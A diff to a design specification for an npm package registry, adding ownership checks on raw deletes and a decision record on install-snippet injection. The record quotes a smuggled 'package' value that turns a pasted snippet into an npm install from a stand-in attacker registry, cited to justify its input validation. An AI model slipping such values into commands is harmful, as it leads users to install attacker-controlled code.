@@ -1034,6 +1034,12 @@ maps to three operations. Each needs `delete` and ownership (R-AUTHZ-007) and th
   way (`OnItemsRemoved`). So does the `PUT` and the `DELETE` above: they remove the files of the
   versions through the package writer in the transaction that checked ownership and the revision,
   and the same hook writes the tombstone, the tags and the audit event (Q-NPM-27).
+- A raw delete, through `/files/` or the items API, of a tarball, a package folder or a scope asks
+  the ownership question for every package whose files it removes, under the package row lock in
+  the removing transaction (or the one that queues the job `items-delete`), and needs `delete` on
+  each file's package and version; a deleter who does not own one of the packages gets `403
+  package_owned_by_other_owner` and nothing is removed ([authorization.md](../authorization.md)
+  R-AUTHZ-018, Q-AUTHZ-161).
 - Remote repositories answer 405; their cached items are removed through the cache API of
   [repositories-and-proxy.md](../repositories-and-proxy.md). Virtual repositories route to the
   deployment target (R-NPM-029). No time window applies.
@@ -1742,8 +1748,10 @@ Priority: **P1** · Covers: PKG-NPM-017, PKG-NPM-018, ART-006
 - From P1, `PUT /files/<npm local>/<path>` with a `.tgz` body (also used by the UI deploy dialog)
   is a publish: name and version come from the tarball's `package.json`, which is also the
   manifest, and R-NPM-007 (without the manifest comparison), R-NPM-008 and R-NPM-016 apply. The
-  tag is `latest` unless the query parameter `distTag` names another. Until then the plug-in
-  refuses raw deploys with 409, as [storage.md](../storage.md) R-STOR-007 describes.
+  tag is `latest` unless the query parameter `distTag` names another. Until then `/files/` refuses
+  every deploy into an npm repository, file or folder, with `409` `conflict` naming the npm
+  protocol address, before the body is read, as [storage.md](../storage.md) R-STOR-007 describes
+  ([architecture.md](../architecture.md) Q-ARCH-223).
 - `<path>` MUST equal the canonical path derived from the tarball; otherwise 400 naming the
   canonical path. This is PKG-NPM-018's path enforcement, always on.
 - Any other file type in an npm repository answers 400. Virtual repositories route to the
@@ -2510,8 +2518,9 @@ Acceptance criteria (fixture of [endpoints.md](../endpoints.md) R-EP-012, with `
   writes no row, so it cannot be used to replace a version or move a tag (Q-NPM-11). A stale
   revision succeeds only for a request that changes nothing (R-NPM-009), so it cannot overwrite a
   concurrent change.
-- **Unpublish through `/files/`.** The unpublish routes ask the ownership question under the package row lock; a raw delete of a tarball through `/files/` removes the version the same
-  way and asks none, because the generic layer decides it and the removal hook has no request (Q-NPM-27, [permissions.md](../../security/permissions.md) H-290).
+- **Unpublish through `/files/`.** The unpublish routes ask the ownership question under the package row lock; a raw delete through `/files/` or the items API asks it too, for
+  every package whose files it removes, in the removing transaction, before the removal hook unpublishes the versions (Q-NPM-27, [authorization.md](../authorization.md) Q-AUTHZ-161).
+  `/files/` takes no file and no folder into an npm repository ([architecture.md](../architecture.md) Q-ARCH-223), so no raw path can block a version's tarball path.
 - **Takedowns and restores.** Unpublishes made after a backup's snapshot are re-applied from the
   journal after a restore by withholding the version, which deletes nothing, so a forged journal
   entry cannot destroy restored content (R-NPM-047, Q-NPM-12). Upstream withdrawals made after the
@@ -3390,7 +3399,8 @@ publish limits (100,000 entries, 2 GiB unpacked).
 `content_refused` where the publish answers 400 `npm_bad_publish` and 413 where a bound is crossed. A publish validates with `npm.publish.*`, which are the format's own.
 
 **Rationale:** R-NPM-007 states 400 for a malformed or ambiguous archive, so the publish keeps it; `Inspect` is the contract's path for content that is not a publish, which the kit
-holds to 413 or 422. The development agent would revisit (b) with R-NPM-036.
+holds to 413 or 422. The development agent would revisit (b) with R-NPM-036. Since [architecture.md](../architecture.md) Q-ARCH-223 the generic layer refuses a deploy through
+`/files/`, file or folder, with `409` before the body is read; the refusal of `OnCommit` stays for any other road that commits an upload without a publish.
 
 **Applied in the spec:** R-NPM-007 (a note after the processing steps), R-NPM-036. Code: `internal/formats/npm/{hooks.go,publish.go,format.go}`.
 
@@ -4025,6 +4035,33 @@ revisit 2 when audit is built (R-NPM-038): the 501 then no longer occurs.
 
 **Applied in the spec:** R-NPM-018 (the answer until it is built), R-NPM-001 (the 501 note), R-NPM-043 (the
 criterion). Code: `internal/formats/npm/handlers_deprecate.go`, `TestR_NPM_043_DeprecateIsRefusedWithoutRetries`.
+
+### Q-NPM-50 · A package or version of the install snippet that a client would read as an option
+
+Status: **Decided by the development agent** — selected from the options below; the owner reviews it at the walkthrough.
+
+Context: the client setup of [api-and-ui.md](../api-and-ui.md) R-API-030 puts `package` and `version` into the install snippets
+of npm, pnpm and Yarn (R-NPM-041). The shell quoting let a value that starts with `-` through bare, and the package was not
+validated as a name: `package=--registry=https://evil.example` gave `npm install --registry=https://evil.example`, a command
+a user pastes from trove's own UI, which a link to the package page can prefill. Quoting does not help by itself: the shell
+removes the quotes, and the client still reads `-…` as an option. `name.Parse`, the rule that looks names up, accepts a legacy
+name that starts with `-` (only a new name may not, R-NPM-002).
+
+| Option | What it means | For | Against |
+|---|---|---|---|
+| (a) Refuse a `package` or `version` that starts with `-`; validate `package` with the format's name rule; quote a value that starts with `-` | `400 malformed_request` before any snippet is built; the package is normalized by the format's one name rule (R-AUTHZ-005); `shellQuote` never leaves a leading `-` bare | No snippet of trove ever hands a client an option it did not offer; a value that is no name of the format never reaches a template | A legacy package whose name starts with `-` gets no install snippet |
+| (b) Insert `--` before the package in the templates | `npm install -- <package>` | Every legacy name works | npm, pnpm and Yarn treat `--` differently; the templates of R-NPM-041 change for a case that has no known package |
+| (c) Quote only | The review's minimum | Small | The client still reads the option |
+
+**Choice:** (a). The `version` has no format rule of its own in the setup (a version, a tag or a range may be asked for), so
+only its first character is refused; the package passes the format's `Names.Normalize`, and the normalized name is what the
+snippet holds.
+
+**Rationale:** an install command is a command a user runs as written; the server must not be the one that turns a parameter into
+an option. The development agent would revisit (b) if a package whose name starts with `-` turns up in a customer's registry.
+
+**Applied in the spec:** [api-and-ui.md](../api-and-ui.md) R-API-030 (the refusals), R-NPM-041. Code:
+`internal/api/v1/packages_api.go` (`clientSetup`), `internal/api/v1/setup_snippets.go` (`shellQuote`).
 
 ### Q-NPM-53 · The publish body cap is the sum of the limits of its parts
 
